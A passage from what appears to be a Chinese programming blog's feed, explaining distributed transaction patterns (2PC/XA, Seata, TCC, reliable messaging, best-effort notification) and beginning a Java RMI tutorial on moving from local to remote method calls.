<li>TM交易中间件通过XA接口来通知RM数据库事务的开始、结束以及提交、回滚等。 </li>
</ol>
<p>总结：<br>整个2PC的事务流程涉及到三个角色AP、RM、TM。AP指的是使用2PC分布式事务的应用程序；RM指的是资源管理器，它控制着分支事务；TM指的是事务管理器，它控制着整个全局事务。 </p>
</blockquote>
<p>XA方案的问题：</p>
<ol>
<li>需要数据库支持XA协议</li>
<li>资源锁需要等两个阶段结束才释放，性能差，会导致锁等待</li>
</ol>
<h4 id="Seata"><a href="#Seata" class="headerlink" title="Seata"></a><a href="https://seata.io/zh-cn/docs/overview/what-is-seata.html">Seata</a></h4><p>​        阿里开源的分布式事务框架，传统2PC的问题在Seata中得到了解决，它通过对本地关系数据库的分支事务的协调来驱动完成全局事务，是工作在应用层的中间件。主要优点是<strong>性能较好</strong>，且<strong>不长时间占用连接资源</strong>，它以高效并且对<strong>业务0侵入</strong>的方式解决微服务场景下面临的<strong>分布式事务问题</strong>，它目前提供AT（2PC）、TCC、SAGA 和 XA 事务模式。<br /></p>
<p>​        第一阶段就将本地事务提交了（提交前需要获取全局事务锁），全局事务管理器统计所有分支事务的结果，如果某个分支出现了异常，在本地事务中有一个<code>UNDO_LOG Table</code>的数据表，记录了之前的数据，修改SQL，修改后的数据。可通过它进行事务的回滚，这里不会产生脏数据就是因为本地事务的提交需要先获取全局事务锁。<br />        第二阶段，如果分支事务都成功，则根据事务ID删除<code>undo_log</code>的记录，如果失败，则找到记录进行回滚。<br /></p>
<p>这里业务说明官网已经写的很详细了，这里我不再赘述。<br />Seata的核心就是通过undo log文件让已经提交的事务，仍能回滚。这样就不用长期占用资源了</p>
<blockquote>
<p>小结：</p>
</blockquote>
<p>这里我们介绍了传统的2PC（基于数据库XA协议）和Seata实现2PC的方案。<br />Seata实现的要点：</p>
<ol>
<li>全局事务开始使用 @GlobalTransactional标识 。 </li>
<li>每个本地事务方案仍然使用@Transactional标识。 </li>
<li>每个数据都需要创建undo_log表，此表是seata保证本地事务一致性的关键。</li>
<li>TM获取到的XID会通过远程调用时传入。</li>
</ol>
<p><a name="V9PXj"></a></p>
<h3 id="分布式事务解决方案—TCC"><a href="#分布式事务解决方案—TCC" class="headerlink" title="分布式事务解决方案—TCC"></a>分布式事务解决方案—TCC</h3><blockquote>
<p>TCC与2PC有啥区别？ 为啥使用？</p>
</blockquote>
<p>​        2PC是定义在<code>数据层</code>的，而且有全局锁的存在，也会有一定的性能消耗。TCC是在业务层定义的，更加灵活，但复杂度也会上升，TCC是<code>try，conform，console</code>三个方法的简写。也就是想实现分布式事务，需要实现这三个方法。下面我们使用框架进行演示<br><a name="a5atC"></a></p>
<h4 id="hmily"><a href="#hmily" class="headerlink" title="hmily"></a><a href="https://gitee.com/dromara/hmily">hmily</a></h4><blockquote>
<p>TCC需要注意三种异常处理分别是空回滚、幂等、悬挂:** **</p>
</blockquote>
<p>这里是指TCC中的<code>try，conform，console</code>是三个独立的线程去完成的，且分布式调用具体网络延迟的可能性。</p>
<ol>
<li>空回滚：try还没执行时，执行console。<ol>
<li>解决思路：我们记录TM生成的全局事务ID，来判断try是否已经执行，如果未执行则不执行console。</li>
</ol>
</li>
<li>悬挂：conform或console已经执行了，才开始执行try<ol>
<li>解决思路：在conform和console执行时将执行记录插入数据，当执行try时进行判断</li>
</ol>
</li>
<li>幂等性：conform和console都是默认成功的，当执行失败时，会不断重试，这就需要保证代码代码幂等性<ol>
<li>解决思路：执行前，先通过全局唯一事务ID，查看自己之前是否执行过。</li>
</ol>
</li>
</ol>
<blockquote>
<p>这里有一个拓宽的思路，就是在本地事务中，记录一张记录表，来判断操作是否执行过，由于是在同一本地事务内，所以可以保证该记录的准确性。</p>
</blockquote>
<p><strong>Try，Console，Conform需要严格处理上面的三个问题，下面我们用业务来说明：</strong><br />**场景为 A 转账 30 元给 B，A和B账户在不同的服务。 **</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 账户A 
try：检查余额是否够30元 扣减30元  （操作是直接提交本地事务的）

confirm： 空 

cancel：增加30元

&#x2F;&#x2F; 账户B
try：增加30元 

confirm： 空 

cancel：减少30元<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>存在问题：</strong><br />1）如果账户A的try没有执行，执行cancel则就多加了30元。 <br />2）由于try，cancel、confifirm都是由单独的线程去调用，且会出现重复调用，所以都需要实现幂等。 <br />3）账号B在try中增加30元，当try执行完成后可能会其它线程给消费了。 <br />4）如果账户B的try没有执行在cancel则就多减了30元。    <br />**问题解决： **<br />1）账户A的cancel方法需要判断try方法是否执行，正常执行try后方可执行cancel。 <br />2）try，cancel、confifirm方法实现幂等。 <br />3）账号B在try方法中不允许更新账户金额，在confirm中更新账户金额。 <br />4）账户B的cancel方法需要判断try方法是否执行，正常执行try后方可执行cancel。 </p>
<pre class="line-numbers language-latex" data-language="latex"><code class="language-latex">// 账户A
try：
	try幂等校验，判断之前执行过没
  try悬挂处理，判断conform和cancel执行过没
	检查余额是否够30元
	扣减30元 

confirm： 空 

cancel：
	cancel幂等校验 
	cancel空回滚处理 
	增加可用余额30元

// 账户B
try：空 

confirm： 
	confirm幂等校验 
	正式增加30元 

cancel：空<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><a name="ObLOT"></a></p>
<h3 id="分布式事务解决方案—可靠消息最终一致性"><a href="#分布式事务解决方案—可靠消息最终一致性" class="headerlink" title="分布式事务解决方案—可靠消息最终一致性"></a><strong>分布式事务解决方案—可靠消息最终一致性</strong></h3><p>​        也算是Base理论的实现<br />可靠消息：张三给李四发钱，张三的账户先减少钱，然后发送一条消息到消息队列，李四进行接收消息增加钱，保证整个过程的可靠性。</p>
<p>最终一致性：张三发钱后，是不能再回滚的，李四就必须获取并消费消息，保证的最终数据是一致的。**</p>
<blockquote>
<p>这中间有什么问题？</p>
</blockquote>
<p>​        张三向消息队列发送消息就一定会出现网络问题，比如：事务内，张三钱减少了，然后发送数据到消息队列，如果发送错误张三的钱也可以回滚，但是可能消息已经到队列了，但返回时网络延迟发生错误，导致数据回滚，则队列中数据是仍然存在的，所以一定要保证数据操作与消息发送保证<code>原子性</code>。<br />        李四需要必须接收并完成消息，但可能出现问题导致不断的重试，所以有<code>幂等性</code>的问题<br><a name="CQSMK"></a></p>
<h4 id="RocketMq"><a href="#RocketMq" class="headerlink" title="RocketMq"></a><a href="https://rocketmq.apache.org/zh/docs/featureBehavior/04transactionmessage">RocketMq</a></h4><p><img src="../../typora-user-images/image-20221202172349710.png" alt="image-20221202172349710"></p>
<blockquote>
<p>这是大概的一个流程，我们现在分析可能存在哪些问题：<br /></p>
</blockquote>
<p>​        张三向消息队列成功发送事务消息后,有一个rockmq监听本地事务方法的返回。这时候事务消息并不能被消费，如果张三正常提交本地事务，则该事务消息可被消费，如果本地事务没有提交成功，返回Rollback则事务消息删除，如果返回UnKnown(比如出现某些异常)，则过一段时间，消息队列会再次监听本地事务执行情况。从而保证张三本地事务与事务消息的原子性。<br />李四从消息队列获取消息后，应该进行本地事务并确认该事务消息，如果没有确认，消息队列会不断发给消费者，最终也可人工处理。<br />        可靠消息最终一致性的优点就是如果李四那边要执行很久，张三这边是不用等的，只要最终确认该事务消息即可。进行了异步解耦。<br><a name="NYbFr"></a></p>
<h3 id="分布式事务解决方案—最大努力通知"><a href="#分布式事务解决方案—最大努力通知" class="headerlink" title="分布式事务解决方案—最大努力通知"></a>分布式事务解决方案—最大努力通知</h3><p><a name="wrMQP"></a></p>
<h4 id="RocketMq-1"><a href="#RocketMq-1" class="headerlink" title="RocketMq"></a><a href="https://rocketmq.apache.org/zh/docs/featureBehavior/04transactionmessage">RocketMq</a></h4><p>我们以支付业务为例<br><img src="../../typora-user-images/image-20221202172428011.png" alt="image-20221202172428011"></p>
<p>这里的账户系统就是等待通知的</p>
<p>充值系统当充值完毕后发起通知</p>
<blockquote>
<p>​        这里我们看出最大努力通知的目标：发起通知方通过一定的机制最大努力将业务处理结果通知到接收方。重点在于结果的可知性，自己会主动推送结果，也提供对方来查询的功能，也就是说结果我一定得让你知道。</p>
</blockquote>
<p>具体包括：</p>
<ol>
<li><p>有一定的消息重复通知机制</p>
<ol>
<li>因为接收通知方可能没有接收到通知，此时要有一定的机制对消息重复通知</li>
</ol>
</li>
<li><p>消息校验机制</p>
<ol>
<li>如果尽最大努力也没有通知到接收方，或者接收方消费消息后要再次消费，此时可由接收方主动向通知方查询信息来满足需求。<blockquote>
<p>最大努力通知与可靠消息一致性有什么不同？</p>
</blockquote>
</li>
</ol>
</li>
<li><p>解决思想不同</p>
</li>
</ol>
<p>可靠消息一致性主要保证消息发送方保证把消息发送出去，并消息接收方成功获取并消费该消息，关键在发起方。<br />最大努力通知则侧重消息能被消息接受者收到，或者可以消息接收方主动来查询消息状态，关键在于接收方。</p>
<ol start="2">
<li>业务应用场景不同</li>
</ol>
<p>可靠消息一致性关注的是交易过程的事务一致，以异步的方式完成交易。 <br />最大努力通知关注的是交易后的通知事务，即将交易结果可靠的通知出去。</p>
<ol start="3">
<li>技术解决方向不同</li>
</ol>
<p>可靠消息一致性要解决消息从发出到接收的一致性，即消息发出并且被接收到。<br />最大努力通知无法保证消息从发出到接收的一致性，只提供消息接收的可靠性机制。可靠机制是，最大努力的将消 息通知给接收方，当消息无法被接收方接收时，由接收方主动查询消息（业务处理结果）。</p>
<p><a name="RmZfj"></a></p>
<h4 id="解决方案-1"><a href="#解决方案-1" class="headerlink" title="解决方案"></a>解决方案</h4><p>消息接收方直接监听消息队列<br /></p>
<p><img src="../../typora-user-images/image-20221202172446775.png" alt="image-20221202172446775"></p>
<p>由消息通知系统监听消息队列，然后再通知消息接收方<br /></p>
<p><img src="../../typora-user-images/image-20221202172502997.png" alt="image-20221202172502997"></p>
<blockquote>
<p>这两者有啥不同？</p>
</blockquote>
<p>第一种只适用于内部网络系统，也就是发起方和接收方都归你管理。但如果说消息发送方是第三方系统，人家就不能让你监听人家的消息队列吧，只能说加入一个中间通知系统，然后通过网络请求来通知你。</p>
<p><a name="VCrLJ"></a></p>
<h3 id="分布式事务综合案例分析"><a href="#分布式事务综合案例分析" class="headerlink" title="分布式事务综合案例分析"></a>分布式事务综合案例分析</h3><p>在上面我们已经学习了四种不同的分布式事务解决方案，我们需要进行区分，哪种业务场景需要哪种实现，各个方案有什么区别。<br><a name="qXtwu"></a></p>
<h4 id="场景一"><a href="#场景一" class="headerlink" title="场景一"></a>场景一</h4><p><img src="../../typora-user-images/image-20221202172515706.png" alt="image-20221202172515706"></p>
<p>用户向用户中心发起注册请求，用户中心保存用户业务信息，然后通知统一账号服务新建该用户所对应登录账号。<br />针对注册业务，如果用户与账号信息不一致，则会导致严重问题，因此该业务对<strong>一致性要求较为严格</strong>，即当用户服务和账号服务任意一方出现问题都需要<strong>回滚事务</strong>。</p>
<blockquote>
<p>业务分析</p>
</blockquote>
<ol>
<li>使用最大努力通知<ol>
<li>不可以，用户服务注册好后，通知账户服务，这里只能说不断通知，没法做到回滚</li>
</ol>
</li>
<li>使用可靠消息一致性<ol>
<li>不可以，用户发送事务消息，然后进行本地事务，如果成功了，也无法保证账户服务成功消费，无法回滚</li>
</ol>
</li>
<li>TCC方案<ol>
<li>可行，支持事务回滚，性能好，但实现复杂</li>
</ol>
</li>
<li>2PC方案<ol>
<li>可行，支持事务回滚，有性能损耗，但简单<br><a name="TURmk"></a><h4 id="场景二"><a href="#场景二" class="headerlink" title="场景二"></a>场景二</h4><img src="../../typora-user-images/image-20221202172528108.png" alt="image-20221202172528108"></li>
</ol>
</li>
</ol>
<p><br />        用户向用户中心提交开户资料，用户中心生成开户请求号并重定向至银行存管系统开户页面。用户设置存管密码并确认开户后，银行存管立即返回“请求已受理”。在某一时刻，银行存管系统处理完该开户请求后，将调用回调地址通知处理结果，若通知失败，则按一定策略重试通知。同时，银行存管系统应提供开户结果查询的接口，供用户中心校对结果。</p>
<blockquote>
<p>业务分析</p>
</blockquote>
<ol>
<li>Seata方案<ol>
<li>不可行，银行存管系统不能让你去编写业务代码吧</li>
</ol>
</li>
<li>TCC方案<ol>
<li>不可行，银行存管系统不会让你写try，conform，console吧</li>
</ol>
</li>
<li>可靠消息最终一致性<ol>
<li>不可行，银行系统不会和用户系统直接通过MQ交互</li>
</ol>
</li>
<li>最大努力通知<ol>
<li>可行，我们发送请求给银行系统，银行系统最终给我返回结果，或者我们也可主动查询<br><a name="gnVFt"></a><h4 id="场景三"><a href="#场景三" class="headerlink" title="场景三"></a>场景三</h4><img src="../../typora-user-images/image-20221202172553120.png" alt="image-20221202172553120"></li>
</ol>
</li>
</ol>
<p>管理员对某标的满标审批通过，交易中心修改标的状态为“还款中”，同时要通知还款服务生成还款计划。</p>
<blockquote>
<p>业务分析</p>
</blockquote>
<ol>
<li>使用Seata<ol>
<li>不行，生成计划如果过久，Seata锁定资源</li>
</ol>
</li>
<li>使用TCC<ol>
<li>本需求对业务一致性要求较低，因为生成还款计划的时长较长，所以不要求交易中心修改标的状态为“还款中”就立 即生成还款计划  ，所以本方案不适用。</li>
</ol>
</li>
<li>使用努力通知<ol>
<li>满标审批通过后由交易中心向还款服务发送通知要求生成还款计划，还款服务并且对外提供还款计划生成结果校对接口供其它服务查询，最大努力  通知方案也适用本场景  。</li>
</ol>
</li>
<li>使用消息一致性<ol>
<li>满标审批通过后由交易中心修改标的状态为“还款中”并且向还款服务发送消息，还款服务接收到消息开始生成还款计划，基本于MQ的可靠消息一致性方案适用此场景  。</li>
</ol>
</li>
</ol>
<p><a name="WqaJQ"></a></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><strong>分布式事务对比分析</strong>:<br /><strong>2PC</strong> 最大的诟病是一个阻塞协议。RM在执行分支事务后需要等待TM的决定，此时服务会阻塞并锁定资源。由于其 阻塞机制和最差时间复杂度高， 因此，这种设计不能适应随着事务涉及的服务数量增加而扩展的需要，很难用于并 发较高以及子事务生命周期较长 (long-running transactions) 的分布式服务中。</p>
<p>如果拿<strong>TCC</strong>事务的处理流程与2PC两阶段提交做比较，2PC通常都是在跨库的DB层面，而TCC则在应用层面的处 理，需要通过业务逻辑来实现。这种分布式事务的实现方式的优势在于，可以让应用自己定义数据操作的粒度，使 得降低锁冲突、提高吞吐量成为可能。而不足之处则在于对应用的侵入性非常强，业务逻辑的每个分支都需要实现 try、conﬁrm、cancel三个操作。此外，其实现难度也比较大，需要按照网络状态、系统故障等不同的失败原因实 现不同的回滚策略。典型的使用场景：满，登录送优惠券等。</p>
<p><strong>可靠消息最终一致性</strong>事务适合执行周期长且实时性要求不高的场景。引入消息机制后，同步的事务操作变为基于消 息执行的异步操作, 避免了分布式事务中的同步阻塞操作的影响，并实现了两个服务的解耦。典型的使用场景：注 册送积分，登录送优惠券等。</p>
<p><strong>最大努力通知</strong>是分布式事务中要求最低的一种,适用于一些最终一致性时间敏感度低的业务；允许发起通知方处理业 务失败，在接收通知方收到通知后积极进行失败处理，无论发起通知方如何处理结果都会不影响到接收通知方的后 续处理；发起通知方需提供查询执行情况接口，用于接收通知方校对结果。典型的使用场景：银行通知、支付结果 通知等。<br /></p>
<p><img src="../../typora-user-images/image-20221202172607739.png" alt="image-20221202172607739"><br /><strong>总结</strong>：</p>
<p>​        在条件允许的情况下，我们<strong>尽可能选择本地事务</strong>单数据源，因为它减少了网络交互带来的性能损耗，且避免了数据 弱一致性带来的种种问题。<strong>若某系统频繁且不合理的使用分布式事务</strong>，应首先从整体设计角度观察服务的拆分是否 合理，是否高内聚低耦合？是否粒度太小？分布式事务一直是业界难题，因为网络的不确定性，而且我们习惯于拿 分布式事务与单机事务ACID做对比。无论是数据库层的XA、还是应用层TCC、可靠消息、最大努力通知等方案，都没有完美解决分布式事务问题，它们 不过是各自在性能、一致性、可用性等方面做取舍，寻求某些场景偏好下的权衡。</p>
]]></content>
      <categories>
        <category>分布式</category>
      </categories>
      <tags>
        <tag>事务</tag>
      </tags>
  </entry>
  <entry>
    <title>从单体到分布式</title>
    <url>//post/%E5%88%86%E5%B8%83%E5%BC%8F/%E5%88%86%E5%B8%83%E5%BC%8F%E7%9A%84%E6%BC%94%E5%8C%96%E8%BF%87%E7%A8%8B.html</url>
    <content><![CDATA[<h1 id="初级阶段（本地调用）"><a href="#初级阶段（本地调用）" class="headerlink" title="初级阶段（本地调用）"></a>初级阶段（本地调用）</h1><p>​    在我们学习java初期，我们都会通过创建一个类对象，用该对象调用自身方法，得到需要的内容。整个过程都在本地当前JVM中进行的。这样的程序是最简单，方便，快速的。后面我们又学习了面向接口编程，用接口去规范子类的行为，也就是说调用者不需要知道具体方法的实现，只调用接口即可。</p>
<p>​    再后来我们又学习了分布式调用这些高端名词，什么Dubbo，什么RPC框架，什么Zookeeper注册中心，说实话我学完还是挺懵逼的，会有种漂浮的感觉，知道它大概是个什么东西后，又说这玩意儿落伍了，让我去看看SpringCloud，Nacos之类的玩意儿，说学这个没问题。现在回想起来有种知识断层的感觉，这种感觉从普通java程序进阶为Spring框架时有，从SpringBoot到SpringCloud时也有。废话不多说了 ，我们开始理理思路吧。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">AllArgsConstructor</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">Data</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Factory</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token class-name">User</span> <span class="token function">askEntity</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> factoryImpl <span class="token keyword">implements</span> <span class="token class-name">Factory</span> <span class="token punctuation">&#123;</span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">User</span> <span class="token function">askEntity</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token string">"旺财"</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token annotation punctuation">@Data</span>
<span class="token annotation punctuation">@AllArgsConstructor</span>
<span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">&#123;</span>
    <span class="token class-name">String</span> name<span class="token punctuation">;</span>
    <span class="token keyword">int</span> age<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> demo<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Factory</span> factory <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">factoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>factory<span class="token punctuation">.</span><span class="token function">askEntity</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    上面这个代码，没啥难度。就是通过Factory实现类，使用类方法返回一个User对象，但这个操作只能我这台机子操作，别人又没源码，简单粗暴的做法，你想用，直接复制粘贴我的源码。但假如有天我发现了一个Bug，只能修改的是我电脑里的代码，发布一个声明，你们知道后，再拷贝一遍，这不是麻烦死了嘛。</p>
<p>​    那转化一个思路，我只知道这个接口，而具体实现在你的电脑上，并发布注册到网络中，当我调用接口方法执行时，其实是将接口名，方法名，参数名，参数属性打包发给你，然后实际是在你的程序中进行执行，然后将结果返回到我这里。这样大家都找你调用服务，如果有bug，和我们没关系，你在你那修改，我们这边照常调用就好。这是不是就有点儿服务注册与发现的感觉了。那具体这个打包发送信息，就可以用上JAVA基础篇中的IO流啦，通过Socket进行TCP/IP连接，通过二进制流数据进行信息的传递，这里就又涉及到了Java对象的序列化与反序列化。底层实际就是我们基础篇学习的东西，只不过加了亿点儿细节。</p>
<p>​    那我们就想，我只想简单的调用个远程服务，上来就给我整个Dubbo框架，配置一堆东西，能不能简单点儿？ 给我缓一下，可以！！！下面就引出了 <code>RMI(Remote Method Invocation)</code>,简单理解就是Java本身对分布式方法调用就有的实现方法。</p>
<h1 id="中级阶段（JVM远程调用）"><a href="#中级阶段（JVM远程调用）" class="headerlink" title="中级阶段（JVM远程调用）"></a>中级阶段（JVM远程调用）</h1><p><img src="../..//typora-user-images/image-20220919215330719.png" alt="image-20220919215330719"></p>
<p>​    有没有感觉这个图很熟悉，我们直接看代码，通过代码可能逻辑能理得更清楚些。</p>
<h2 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h2><blockquote>
<p>Entity层：需要传输的对象</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Data</span>  
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 这里我们实现了Serializable接口和指定serialVersionUID，为了保证序列化与反序列化正常</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span> <span class="token number">6490921832856589236L</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token class-name">Integer</span> age<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>Service，ServiceImpl层：定义接口，和具体的实现类</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 这里继承Remote接口是关键，并且也需要保证序列化</span>
<span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Factory</span> <span class="token keyword">extends</span> <span class="token class-name">Remote</span><span class="token punctuation">,</span> <span class="token class-name">Serializable</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span> <span class="token number">6490921832856589236L</span><span class="token punctuation">;</span>
    <span class="token comment">/**
     * 查找用户
     * @param userId
     * @return
     * @throws RemoteException  这里必须抛出异常
     */</span>
    <span class="token class-name">User</span> <span class="token function">findUser</span><span class="token punctuation">(</span><span class="token class-name">String</span> userId<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 具体的接口实现类</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FactoryImpl</span> <span class="token keyword">implements</span> <span class="token class-name">Factory</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token class-name">FactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span> <span class="token punctuation">&#123;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">User</span> <span class="token function">findUser</span><span class="token punctuation">(</span><span class="token class-name">String</span> userId<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 就是简单的判断Id，决定是否返回对象。</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"110"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>userId<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">User</span> user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            user<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"金庸"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            user<span class="token punctuation">.</span><span class="token function">setAge</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> user<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RemoteException</span><span class="token punctuation">(</span><span class="token string">"查无此人"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>Main：启动类</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RmiServer</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"create remote service..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 实例化一个userService,这个实例就是未来真正干活的对象</span>
        <span class="token class-name">UserService</span> userService1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UserServiceImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 这里其实相当于把userService1实例挂载到某个端口中，也就是服务端:  如果这里port=0，表示内核就会为我们随机一个端口</span>
        <span class="token class-name">UserService</span> rmiUserService1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">UserService</span><span class="token punctuation">)</span> <span class="token class-name">UnicastRemoteObject</span><span class="token punctuation">.</span><span class="token function">exportObject</span><span class="token punctuation">(</span>userService1<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 将RMI服务注册到1099端口，也就是注册中心</span>
        <span class="token class-name">Registry</span> registry <span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 绑定此服务，服务名为"UserService": 这里已经很像注册中心了，注册中心有一个端口，服务提供者一个端口</span>
        registry<span class="token punctuation">.</span><span class="token function">rebind</span><span class="token punctuation">(</span><span class="token string">"UserService"</span><span class="token punctuation">,</span> rmiUserService1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><blockquote>
<p>Entity：和服务端一致</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Data</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span> <span class="token number">6490921832856589236L</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token class-name">Integer</span> age<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>Service：和服务端一值</p>
</blockquote>
